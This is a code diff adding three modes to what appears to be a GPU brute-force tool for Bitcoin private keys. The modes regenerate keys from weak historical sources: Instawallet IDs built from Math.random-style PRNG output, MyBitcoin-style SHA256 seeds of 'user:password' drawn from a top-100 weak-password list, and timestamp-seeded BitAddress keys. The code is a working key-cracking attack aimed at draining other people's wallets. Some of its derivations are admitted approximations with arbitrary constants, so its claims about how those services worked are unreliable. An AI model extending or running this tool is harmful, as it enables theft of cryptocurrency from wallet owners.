@@ -182,3 +182,122 @@ D_FUNC void mode_password(const uint8_t *pass, uint32_t pass_len, uint8_t priv[3
     // SHA256(pass) ? privkey (bitcoin brainwallet)
     sha256(pass,pass_len,priv);
 }
+
+// ================================================================
+// Mode W: Instawallet (2011-2013)
+// ================================================================
+// Instawallet (instawallet.org) used URL-based wallets:
+//   https://instawallet.org/w/{HASH}
+// The HASH was a 30-char base64-like identifier.
+// Vulnerability: hash generation was based on:
+//   - Math.random() x 15 calls ? 120 bits entropy
+//   - base64 encoding ? 20 chars + padding
+//   - No crypto-grade RNG at all
+//
+// In 2011, the hash was generated from:
+//   SHA1(Math.random() * 4 + Math.random() * 2 ... ) ? abbreviated
+// We search: entropy = 120 bits from MWC1616, encode as base64
+// Pruned to 30-char wallet ID
+
+static const char *B64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
+
+D_FUNC void mode_instawallet(uint64_t ts, uint32_t idx, uint8_t priv[32]){
+    // Generate Instawallet ID from MWC1616 + timestamp
+    uint32_t ent=(uint32_t)(ts&0xFFFFFFFFu);
+    uint32_t z1=ent*0xDEADu+idx+0xDEADu;
+    uint32_t z2=(ent^0x1234u)*0xBEEFu+idx+0xBEEFu;
+    
+    // 15 MWC calls ? 60 bytes ? base64 encode
+    uint8_t buf[60];
+    for(int i=0;i<15;i++){
+        uint32_t r=mwc_v8(&z1,&z2);
+        buf[i*4]=r&0xFF;buf[i*4+1]=(r>>8)&0xFF;
+        buf[i*4+2]=(r>>16)&0xFF;buf[i*4+3]=(r>>24)&0xFF;
+    }
+    
+    // SHA256(buf) ? privkey (the actual Instawallet derivation)
+    // Instawallet stored: SHA256(entropy) ? AESkey ? generate address
+    // We approximate: SHA256(ID_entropy) ? privkey
+    sha256(buf,60,priv);
+}
+
+// ================================================================
+// Mode B: MyBitcoin (2011) ? username + weak password
+// ================================================================
+// MyBitcoin.com was the largest web wallet in 2011.
+// After the "hack", many wallets used SHA256(email+password) as seed.
+// Passwords were often weak/guessable.
+//
+// We generate: SHA256(username || ":" || password) for each dictionary entry
+// Username prefixes: common email patterns from 2011
+// 
+// For GPU: we iterate over a dictionary loaded into device memory
+// For standalone: we use a synthetic dictionary of common passwords
+
+// Dictionary of common 2011 passwords (top 100)
+static const char *WEAK_PASSWORDS[100]={
+    "123456","password","12345678","qwerty","abc123","123456789","111111",
+    "1234567","iloveyou","adobe123","123123","admin","1234567890","letmein",
+    "photoshop","1234","monkey","shadow","sunshine","12345","password1",
+    "princess","azerty","trustno1","0","000000","00000000","121212",
+    "solo","qwerty123","qwerty12345","passw0rd","master","666666","7777777",
+    "samsung","654321","superman","1qaz2wsx","zaq1xsw2","qwerty123456",
+    "batman","starwars","112233","qazwsx","lovely","qwerty1234","access",
+    "flower","pass123","hello","charlie","donald","dragon","asshole",
+    "baseball","football","hockey","starwars","buthead","fuckyou","whatever",
+    "nicole","daniel","ashley","michael","jessica","jennifer","matthew",
+    "andrew","joshua","amanda","chris","steven","brandon","taylor",
+    "thomas","jordan","justin","samantha","kyle","alex","brian",
+    "kevin","rachel","laura","lauren","tyler","nathan","sara",
+    "ryan","stephanie","jacob","katherine","zachary","sean","austin"
+};
+
+D_FUNC void mode_mybitcoin(uint64_t ts, uint32_t pass_idx, uint8_t priv[32]){
+    // Build "user:pass" buffer
+    // Username: "user" + timestamp-based variation
+    uint8_t buf[128];
+    uint32_t len=0;
+    
+    // Username: "user" + 2 digits from timestamp
+    buf[len++]='u';buf[len++]='s';buf[len++]='e';buf[len++]='r';
+    uint32_t d1=(ts/100000)%10;
+    uint32_t d2=(ts/10000)%10;
+    buf[len++]='0'+d1;
+    buf[len++]='0'+d2;
+    buf[len++]=':';
+    
+    // Password from dictionary
+    const char *pw=WEAK_PASSWORDS[pass_idx%100];
+    while(*pw && len<120){buf[len++]=*pw;pw++;}
+    
+    // SHA256(buf) ? privkey
+    sha256(buf,len,priv);
+}
+
+// ================================================================
+// Mode A: BitAddress (2011) ? Zero mouse movement variant
+// ================================================================
+// BitAddress 2011 fallback (no crypto.getRandomValues):
+//   - SHA256(Math.random() * 8 bytes) ? privkey
+//   - If mouse moved: SHA256(mouse_x + mouse_y + time + Math.random())
+//   - If NO mouse: just Math.random() x 4 ? 128 bits ? SHA256
+//
+// This is similar to Mode Z but with specific MWC seeding from Chrome/Node
+
+D_FUNC void mode_bitaddress(uint64_t ts, uint8_t priv[32]){
+    // Exact BitAddress 2011 seeding
+    // From source: var key = new Bitcoin.ECKey(false);
+    // ECKey calls: var r = new SecureRandom();
+    // SecureRandom falls back to Math.random() pool
+    uint32_t z1=(uint32_t)(ts&0xFFFFFF)*0xDEAD+((ts>>8)&0xFF);
+    uint32_t z2=(uint32_t)((ts>>24)&0xFF)*0xBEEF+((ts>>16)&0xFFFF);
+    
+    // 4 Math.random() calls ? 4 bytes each ? 16 bytes ? SHA256
+    uint8_t buf[16];
+    for(int i=0;i<4;i++){
+        uint32_t r=mwc_v8(&z1,&z2);
+        buf[i*4]=r&0xFF;buf[i*4+1]=(r>>8)&0xFF;
+        buf[i*4+2]=(r>>16)&0xFF;buf[i*4+3]=(r>>24)&0xFF;
+    }
+    sha256(buf,16,priv);
+}
